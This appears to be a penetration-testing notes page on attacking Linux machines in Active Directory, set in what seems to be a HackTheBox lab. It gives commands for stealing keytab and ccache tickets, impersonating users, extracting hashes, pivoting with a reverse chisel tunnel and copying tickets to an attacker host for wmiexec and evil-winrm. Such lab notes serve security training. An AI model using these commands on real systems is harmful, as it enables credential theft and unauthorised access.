---
title: Linux in active directory
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active directory
  - linux
---
# Linux in active directory

[Index of Active Directory](active-directory.md)

[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Active directory: connecting to other hosts](active-directory-connections.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)

!!! tip "Linux in AD"
	- [Linux in active directory](linux-in-active-directory.md)



## Kerberos on Linux

A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

### ccache files
In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.

This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed.

These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

### keytab files

A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.

[Keytab](https://kb.iu.edu/d/aumh) files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.

>Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.


### krb5.keytab

A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account.



## Check If Linux Machine is Domain Joined

We have a foothold in the Linux target machine and we can see if is domain joined with:

```bash
realm list
```

In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). 

Check out if these tools are available in the target:

```bash
ps -ef | grep -i "winbind\|sssd"
```


## Finding Kerberos Tickets in Linux


### keytab files

#### Impersonating a User with a keytab

**1.  Find the keytab files**. 

```bash
find / -type f -name "*.keytab" 2>/dev/null
```

**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

Keytabs in cronjobs:

```bash
# Keytabs in cronjobs:
crontab -l
# If no cron jobs are defined we will the message "no crontab for $username". If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script.
```

**2.  Listing keytab File Information**

From the previous step we got a `.keytab` file. Now we will list the keytab file information:

```bash
klist -k -t /opt/specialfiles/carlos.keytab 
```

Output:

```bash
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 01/19/2025 10:45:02 carlos@INLANEFREIGHT.HTB
   1 01/19/2025 10:45:02 carlos@INLANEFREIGHT.HTB
   1 01/19/2025 10:45:02 carlos@INLANEFREIGHT.HTB
```


**3. Impersonating a User with a keytab**

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

```bash
# Check which ticket you are using. Basically it displays the Kerberos tickets that are currently cached for the user.
klist

# Impersonate with kinit. kinit obtains a Kerberos ticket for the user `carlos@INLANEFREIGHT.HTB` using a keytab file instead of a password.
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
# -k:  Specifies that a keytab file will be used to authenticate, instead of prompting for a password.
# -t /opt/specialfiles/carlos.keytab: Specifies the path to the **keytab file** (a file containing the encrypted credentials for the user).

# Check which ticket you are using now
klist

# Using the ticket. For instance, connecting to SMB Share as Carlos
smbclient //dc01/carlos -k -c ls
# -k: Enables **Kerberos authentication**. This tells `smbclient` to use the Kerberos ticket currently in the cache instead of asking for a username and password.
# -c ls: Runs the ls command on the SMB share to list its contents. The -c option allows you to pass commands to be executed on the SMB server directly from the command line.
```

#### Extracting secrets from a keytab file

We can attempt to crack the account's password by extracting the hashes from the keytab file with [KeyTabExtract](keytabextract.md).

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

- **With the NTLM hash**, we can perform a Pass the Hash attack. 
- **With the AES256 or AES128 hash**, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.


### ccache Files

**1. Finding the ccache file**

A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the `KRB5CCNAME` environment variable.

`ccache` files are located, by default, at `/tmp`

```bash
env | grep -i krb5
```

 if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.

**Searching for ccache Files in /tmp**:

```shell-session
 ls -la /tmp
```

**2. Importing the ccache file into our current session**

```shell-session
# Copying the file in our home
cp /tmp/krb5cc_647401106_hdWu4q /root

# Importing the ccache File into our Current Session
export KRB5CCNAME=/root/krb5cc_647401106_HRJDux

# now we can list the tickets and check we could impersonate the user we selected
klist
```

**3. Exploiting them** 

If the expiration date has passed, the ticket will not work. `ccache files` are temporary.

```
# For instance we can do this:
smbclient //DC01/julio -k -c ls
smbclient //DC01/julio -k -c 'get julio.txt'
```

## Using Linux Attack Tools with Kerberos

In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

From the kali attacking machine:

```bash
# From the kali attacking machine, we will set the hosts file to resolve to the targets:
cat /etc/hosts

# Output should be:
# 172.16.1.15 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
# 172.16.1.5  ms01.inlanefreight.htb  ms01

# From the kali attacking machine, we will configure proxychains:
cat /etc/proxychains.conf

# Output should be
# <SNIP>
# 
# [ProxyList]
# socks5 127.0.0.1 1080


# From the kali machine we run a reverse chisel server:
 sudo chisel server --reverse
```

We will connect via RDP to the pivot host with our non priv user:

```shell-session
# Connect via RDP
xfreerdp /v:10.129.204.140 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

# Open a powershell terminal and run the chisel client
cd C:\tools\
.\chisel.exe client $IPAttackingmachine:8080 R:socks
```

Now we can get a ccache file belonging to a user and impersonate him from our kali machine.

**Step 1**: Transfer the ccache file to your kali attacking machine. Several transferring techniques can be performed here. We will use the base64 encoding one.

```
# From a terminal in the pivot host, list ccache files
ls -la /tmp

# Now base64 encode the file and print it out
base64 /tmp/krb5cc_647401106_PlqZj5 -w 0
```

```
# FRom the kali machine, save the decoded base64 string into a file:
echo -n "BQQAAAAAAAEAAAABAAAAEUlOTEFORUZSRUlHSFQuSFRCAAAABWp1bGlvAAAAAQAAAAEAAAARSU5MQU5FRlJFSUdIVC5IVEIAAAAFanVsaW8AAAACAAAAAgAAABFJTkxBTkVGUkVJR0hULkhUQgAAAAZrcmJ0Z3QAAAARSU5MQU5FRlJFSUdIVC5IVEIAEgAAACBXqwYqYKQOi1J33HE0yM/afJ6QIZolxCn1KIo8JyEV7GeM8qBnjPKgZ41/QGeORCAAUOEAAAAAAAAAAAAAAAAEr2GCBKswggSnoAMCAQWhExsRSU5MQU5FRlJFSUdIVC5IVEKiJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRCo4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEtKujwmASPo0QsWAE0D8yJTtZ7hfTKml953QEemxVI6YtPmpSNostwzPgc1j0t60t0qIAMJbSdlSadjw86K4oUcxQ9m9ft4aThH6PpBdu8ObOpsSgmfkpD6PO3QSB43zlCAdiTsT1k2gnp22mQHMb+nL23qNP02d+KSChxw2F+W5qpZb9ROjN/g8oL6KkPQE+dyKOpvbeO1sYwAjQy8aCUMahZAZ9nENNQKxehy2fTUFYBOw+nYEtfNqMpGXEuA2QhkCuz0TJ+xFBwogV7S93mQZTuXUFFzCf3k6stv2ggiga58uJaPLgt1sdcaUbceCYUzjnQbu3FOY/FrAEcwRxGTcp5TFrnbKiIqeZS/QfpMrM81SCToLw+YpftAH4taKxTG8+2gRWfg7M0DDCMjdcbBNMnlfLFh9wtfAd7rz7o6mxtHe6NbuVnPuRCzMztqTr60qt6niMpIo5w9YAX4L9MfWlMLldiMQFH77cCpwo7VZTTbMpnszpbSFb64skViq/PRIm0rYMyvZnsUpEejQ9Q/Bd2UOVJppFyMJo8lmgnPm9uH1gUkk01JxMj81Uln70kdVO7TbXhEdcbX7YXGU/z5l3mJV8xDWhGZAE9vNwC/fnax2P3hNTRQsrR3er2B0tAwNy0xnoeCWPpqaPybp/jo/vwyluXkVECwN/xvQlS9DXUkx79R78bP/2K4HINBvyC67MBf8T19S63G/qHliTzw9sjpwalWgPpPn4QkPPJz+/tVfjS7af/Tan7OTSi0QOqS9i9FyZAGhSj+nfab67Bc/8ycwyqmV+5iNBG4E2OfoG0s0/FGyD+lVUhQX/gtcukU3g/PI5TxzdlEbbUHrHCHVQo/c3yVW1xFZ05zC/668goKexS0m8oEVCw5s63Ad2cInQmFG72kmj/pMPKla2s3HXgujEbTHJbfteR64/WEqBqa09MW6bFAil5bOeH0L2+gJ3zEZcMc82EbHQ2NE6SpTanKOakSMQ2n9kB+wjKHrVQl5seDioaIQ3nGQVeO7IrTzyw98Qk0GRNUjFkRWSELGPDx06cTdN8ZsEcjneIcuYV7PuHODk5FHocunaVgLNC1p4BYKZOskoaz5fTtXKoif3pdCjqCwFkfp2GSr4/EJ+iTxUonq64ZJ5b7Ldu6hC0ROvq2Vyz1inWSi2IXGfAfZKeXZ1iA9HsRs1vdslA2qWmLflfytUXifWko6LKVpgVwwYzXUDjqDKtKfobRrQI9sOgF1pHYAtfF5XWYPUJixYIpEGBFRguB0w6hrSPgLhQh4njz75XN0E6JsdFyNJHbi72hX3dZVIMqlEc7K335Rgz/TURmxLEVaa5Ti6s0/TPLy+ehqOZHbWobX3FogazuKQKHMQ0axZfMGDHevCLtjhzec2k5thNmrfmcS1bWHI7kOcjdDEJVqmEG8sYSr6dOgkYh3f29mfM6iKCO7W4DRgpX//UKiYV5p2bhAAAAAA==" | base64 -d > krb5cc_647401106_PlqZj5

# Now in kali we can export the ticket:
export KRB5CCNAME=~/borrar/krb5cc_647401106_PlqZj5

# From kali, check that the ticket is in use:
klist
```

### Using wmiexec with Kerberos 

After completing the steps above:

```
# Connect with wmiexec from impacket by using the ccache ticket
proxychains python3 /impacket/examples/wmiexec.py DC01 -k
```


### Using Evil-WinRM with Kerberos


After completing the steps above:

```
# From the kali machine make sure that we have krb5-user installed
sudo apt-get install krb5-user -y

# Set default realm and realm to the domain
cat /etc/kbr5.conf
# Output should be adapted to something like this (the comments with # are mine):
# [libdefaults]
#         default_realm = INLANEFREIGHT.HTB
# 
# <SNIP>
# 
# [realms]
#     INLANEFREIGHT.HTB = {
#        kdc = dc01.inlanefreight.htb
#    }
#
# <SNIP>

# And now we can use Evil-WinRm
proxychains evil-winrm -i dc01 -r inlanefreight.htb
# i: specifies the target host or IP address (in this case, dc01) that the evil-winrm command will attempt to connect to.
# -r: This flag specifies the domain of the target system.
```



## Converting ccache and kirbi files

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.


Convert ccache file into a kirbi one:

```shell-session
impacket-ticketConverter krb5cc_647401106_AL9htx julio.kirbi
```


Importing Converted Ticket into Windows Session with Rubeus: 

```cmd-session
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```


## Linikatz 

[See linikatz](linikatz.md).

